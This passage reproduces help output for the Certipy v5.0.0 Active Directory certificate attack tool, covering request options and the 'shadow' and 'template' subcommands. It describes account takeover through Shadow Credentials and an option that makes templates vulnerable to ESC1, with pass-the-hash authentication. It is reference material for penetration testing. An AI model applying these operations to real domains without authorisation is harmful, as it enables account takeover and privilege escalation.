                        Use a Certificate Request Agent certificate to request on behalf of another user  
  -pfx pfx/p12 file name  
                        Path to PFX for -on-behalf-of or -renew  
  -pfx-password PFX file password  
                        Password for the PFX file  
  -key-size RSA key length  
                        Length of RSA key (default: 2048)  
  -archive-key          Send private key for Key Archival  
  -cax-cert             Retrieve CAX Cert for relay with enabled Key Archival  
  -renew                Create renewal request  
  -application-policies Application Policy [Application Policy ...]  
                        Specify application policies for the certificate request using OIDs (e.g., '1.3.6.1.4.1.311.10.3.4' or 'Client Authentication')  
  -smime encryption algorithm  
                        Specify SMIME Extension that gets added to CSR (e.g., des, rc4, 3des, aes128, aes192, aes256)  
​  
output options:  
  -out output file name  
                        Path to save the certificate and private key (PFX format)  
​  
connection options:  
  -web                  Use Web Enrollment instead of RPC  
  -dcom                 Use DCOM Enrollment instead of RPC  
  -dc-ip ip address     IP address of the domain controller. If omitted, it will use the domain part (FQDN) specified in the target parameter  
  -dc-host hostname     Hostname of the domain controller. Required for Kerberos authentication during certain operations. If omitted, the domain part (FQDN) specified in the account  
                        parameter will be used  
  -target-ip ip address  
                        IP address of the target machine. If omitted, it will use whatever was specified as target. Useful when target is the NetBIOS name and cannot be resolved  
  -target dns/ip address  
                        DNS name or IP address of the target machine. Required for Kerberos authentication  
  -ns ip address        Nameserver for DNS resolution  
  -dns-tcp              Use TCP instead of UDP for DNS queries  
  -timeout seconds      Timeout for connections in seconds (default: 10)  
​  
rpc connection options:  
  -dynamic-endpoint     Prefer dynamic TCP endpoint over named pipe  
​  
http connection options:  
  -http-scheme http scheme  
                        HTTP scheme to use for Web Enrollment (default: http)  
  -http-port port number  
                        Web Enrollment port (default: 80 for http, 443 for https)  
  -no-channel-binding   Disable channel binding for HTTP connections  
​  
authentication options:  
  -u username@domain, -username username@domain  
                        Username to authenticate with  
  -p password, -password password  
                        Password for authentication  
  -hashes [lmhash:]nthash  
                        NTLM hash  
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the  
                        ones specified in the command line  
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)  
  -no-pass              Don't ask for password (useful for -k)  
​  
ldap options:  
  -ldap-scheme ldap scheme  
                        LDAP connection scheme to use (default: ldaps)  
  -ldap-port port       Port for LDAP communication (default: 636 for ldaps, 389 for ldap)  
  -no-ldap-channel-binding  
                        Don't use LDAP channel binding for LDAP communication (LDAPS only)  
  -no-ldap-signing      Don't use LDAP signing for LDAP communication (LDAP only)  
  -ldap-simple-auth     Use SIMPLE LDAP authentication instead of NTLM  
  -ldap-user-dn dn      Distinguished Name of target account for LDAP authentication
```

---

### `shadow -h`

```BASH
$ certipy shadow -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy shadow [-h] [-account target account] [-device-id device id] [-out output file name] [-dc-ip ip address] [-dc-host hostname] [-target-ip ip address]  
                      [-target dns/ip address] [-ns ip address] [-dns-tcp] [-timeout seconds] [-u username@domain] [-p password] [-hashes [lmhash:]nthash] [-k] [-aes hex key] [-no-pass]  
                      [-ldap-scheme ldap scheme] [-ldap-port port] [-no-ldap-channel-binding] [-no-ldap-signing] [-ldap-simple-auth] [-ldap-user-dn dn]  
                      {list,add,remove,clear,info,auto}  
​  
Manipulate Key Credential Links (Shadow Credentials) on Active Directory accounts. This allows for account takeover by adding or modifying Key Credential Links.  
​  
positional arguments:  
  {list,add,remove,clear,info,auto}  
                        Operation to perform on Key Credential Links: list (view all), add (create new), remove (delete specific), clear (remove all), info (display detailed  
                        information), auto (automatically exploit)  
​  
options:  
  -h, --help            show this help message and exit  
​  
account options:  
  -account target account  
                        Account to target. If omitted, the user specified in the target will be used  
  -device-id device id  Device ID of the Key Credential Link to target  
​  
output options:  
  -out output file name  
                        Output file for saving certificate or results  
​  
connection options:  
  -dc-ip ip address     IP address of the domain controller. If omitted, it will use the domain part (FQDN) specified in the target parameter  
  -dc-host hostname     Hostname of the domain controller. Required for Kerberos authentication during certain operations. If omitted, the domain part (FQDN) specified in the account  
                        parameter will be used  
  -target-ip ip address  
                        IP address of the target machine. If omitted, it will use whatever was specified as target. Useful when target is the NetBIOS name and cannot be resolved  
  -target dns/ip address  
                        DNS name or IP address of the target machine. Required for Kerberos authentication  
  -ns ip address        Nameserver for DNS resolution  
  -dns-tcp              Use TCP instead of UDP for DNS queries  
  -timeout seconds      Timeout for connections in seconds (default: 10)  
​  
authentication options:  
  -u username@domain, -username username@domain  
                        Username to authenticate with  
  -p password, -password password  
                        Password for authentication  
  -hashes [lmhash:]nthash  
                        NTLM hash  
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the  
                        ones specified in the command line  
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)  
  -no-pass              Don't ask for password (useful for -k)  
​  
ldap options:  
  -ldap-scheme ldap scheme  
                        LDAP connection scheme to use (default: ldaps)  
  -ldap-port port       Port for LDAP communication (default: 636 for ldaps, 389 for ldap)  
  -no-ldap-channel-binding  
                        Don't use LDAP channel binding for LDAP communication (LDAPS only)  
  -no-ldap-signing      Don't use LDAP signing for LDAP communication (LDAP only)  
  -ldap-simple-auth     Use SIMPLE LDAP authentication instead of NTLM  
  -ldap-user-dn dn      Distinguished Name of target account for LDAP authentication
```

---

### `template -h`

```BASH
$ certipy template -h  
Certipy v5.0.0 - by Oliver Lyak (ly4k)  
​  
usage: certipy template [-h] -template template name [-write-configuration configuration file] [-write-default-configuration] [-save-configuration configuration file] [-no-save] [-force]  
                        [-dc-ip ip address] [-dc-host hostname] [-target-ip ip address] [-target dns/ip address] [-ns ip address] [-dns-tcp] [-timeout seconds] [-u username@domain]  
                        [-p password] [-hashes [lmhash:]nthash] [-k] [-aes hex key] [-no-pass] [-ldap-scheme ldap scheme] [-ldap-port port] [-no-ldap-channel-binding] [-no-ldap-signing]  
                        [-ldap-simple-auth] [-ldap-user-dn dn]  
​  
Manipulate certificate templates in Active Directory. This command allows viewing and modifying template configurations for privilege escalation testing or remediation.  
​  
options:  
  -h, --help            show this help message and exit  
  -template template name  
                        Name of the certificate template to operate on (case-sensitive)  
​  
configuration options:  
  -write-configuration configuration file  
                        Apply configuration from a JSON file to the certificate template. Use this option to restore a previous configuration or apply custom settings. The file should  
                        contain the template configuration in valid JSON format.  
  -write-default-configuration  
                        Apply the default Certipy ESC1 configuration to the certificate template. This configures the template to be vulnerable to ESC1 attack.  
  -save-configuration configuration file  
                        Save the current template configuration to a JSON file. This creates a backup before making changes or documents the current settings. If not specified when using  
                        -write-configuration or -write-default-configuration, a backup will still be created.  
  -no-save              Skip saving the current template configuration before applying changes. Use this option to apply modifications without creating a backup file.  
  -force                Don't prompt for confirmation before applying changes. Use this option to apply modifications without user interaction.  
​  
connection options:  
  -dc-ip ip address     IP address of the domain controller. If omitted, it will use the domain part (FQDN) specified in the target parameter  
  -dc-host hostname     Hostname of the domain controller. Required for Kerberos authentication during certain operations. If omitted, the domain part (FQDN) specified in the account  
                        parameter will be used  
  -target-ip ip address  
                        IP address of the target machine. If omitted, it will use whatever was specified as target. Useful when target is the NetBIOS name and cannot be resolved  
  -target dns/ip address  
                        DNS name or IP address of the target machine. Required for Kerberos authentication  
  -ns ip address        Nameserver for DNS resolution  
  -dns-tcp              Use TCP instead of UDP for DNS queries  
  -timeout seconds      Timeout for connections in seconds (default: 10)  
​  
authentication options:  
  -u username@domain, -username username@domain  
                        Username to authenticate with  
  -p password, -password password  
                        Password for authentication  
  -hashes [lmhash:]nthash  
                        NTLM hash  
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the  
                        ones specified in the command line  
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256 bits)  
  -no-pass              Don't ask for password (useful for -k)  
​  
ldap options:  
  -ldap-scheme ldap scheme  
                        LDAP connection scheme to use (default: ldaps)  
  -ldap-port port       Port for LDAP communication (default: 636 for ldaps, 389 for ldap)  
  -no-ldap-channel-binding  
                        Don't use LDAP channel binding for LDAP communication (LDAPS only)  
  -no-ldap-signing      Don't use LDAP signing for LDAP communication (LDAP only)  
  -ldap-simple-auth     Use SIMPLE LDAP authentication instead of NTLM  
  -ldap-user-dn dn      Distinguished Name of target account for LDAP authentication`
```